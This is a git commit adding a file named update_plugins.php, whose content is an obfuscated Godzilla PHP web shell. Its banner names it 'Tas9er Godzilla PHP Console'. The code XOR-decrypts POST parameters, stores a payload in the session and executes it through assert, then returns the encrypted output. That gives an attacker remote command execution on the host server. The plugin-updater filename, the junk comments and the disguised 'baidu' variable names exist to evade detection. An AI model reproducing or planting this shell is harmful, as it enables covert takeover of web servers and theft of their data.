a1cc410beede8fdb8f560119451651109eacf4a5
hgcid0gih <167621650+hgcid0gih@users.noreply.github.com>
2024-05-06 18:20:28 +0800

    Add files via upload

---
+++ update_plugins.php
@@ -0,0 +1,39 @@
+Hello Administrator!
+WelCome To Tas9er Godzilla PHP Console!
+<?pHP
+@session_start();
+@set_time_limit(Chr("48"));
+@error_reporting/*fuckgov4SxQMJp1l*/(Chr("48"));
+function baiduVj22m1jXPvgKzRE(/*fuckgov3nNdEnjL7ByE*/$baiduuJmi,$baiduKQa){
+    for($baidujif2unSY=Chr("48");$baidujif2unSY<strlen($baiduuJmi);$baidujif2unSY++) {
+        $baiduKWn0IIuWo5HSra2 = $baiduKQa[$baidujif2unSY+Chr("49")&15];
+        $baiduuJmi[$baidujif2unSY] = $baiduuJmi[$baidujif2unSY]^$baiduKWn0IIuWo5HSra2;
+    }
+    return $baiduuJmi;
+}
+$baiduGg = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$base64_baiduVj22m1jXPvgKzRE = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$baiduDO=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baiduGg($baiduGg("Y2c9PQ=="));
+$baiduKx2VPWey7='p'.$baiduGg($baiduGg("WVhsc2IyRms="));
+$baiduvLbB='b709a33e'.$baiduGg("ODdmN2RjMDY=");
+$baidug=("!"^"@").'ss'.Chr("101").'rs';
+$baidug++;
+if (isset($_POST/*fuckgovpvq6CzVVm0hZcWC*/[$baiduDO])){
+    $datbaidug=baiduVj22m1jXPvgKzRE/*fuckgovun47ijTkuIzE*/($baiduGg($_POST[$baiduDO]),$baiduvLbB);
+    if (/*fuckgovS*/isset($_SESSION/*fuckgov7I7qk6BBO4Kp*/[$baiduKx2VPWey7])){
+        $baiduyE0MryopLVxSO=baiduVj22m1jXPvgKzRE($_SESSION/*fuckgovtvgM3PeqGLs7*/[$baiduKx2VPWey7],$baiduvLbB);
+        if (/*fuckgovz2qWF9S7*/strpos($baiduyE0MryopLVxSO,$baiduGg/*fuckgovZ63NLxLK*/($baiduGg("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $baiduyE0MryopLVxSO=baiduVj22m1jXPvgKzRE/*fuckgov8IRds*/($baiduyE0MryopLVxSO,$baiduvLbB);
+        }
+		define("baidudk9v2hu8","//baiduCV\r\n".$baiduyE0MryopLVxSO);
+		$baidug(baidudk9v2hu8);
+        echo substr(/*fuckgovt5*/md5/*fuckgovwSfUaB*/($baiduDO.$baiduvLbB),Chr("48"),16);
+        echo $base64_baiduVj22m1jXPvgKzRE(baiduVj22m1jXPvgKzRE(@run($datbaidug),$baiduvLbB));
+        echo substr(/*fuckgovUhj4aM2DXTuz*/md5/*fuckgovttzg7fxO6i99MjF*/($baiduDO.$baiduvLbB),16);
+    }else{
+        if (strpos/*fuckgovZO*/($datbaidug,$baiduGg($baiduGg("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$baiduKx2VPWey7]=baiduVj22m1jXPvgKzRE($datbaidug,$baiduvLbB);
+        }
+    }
+}
+?>
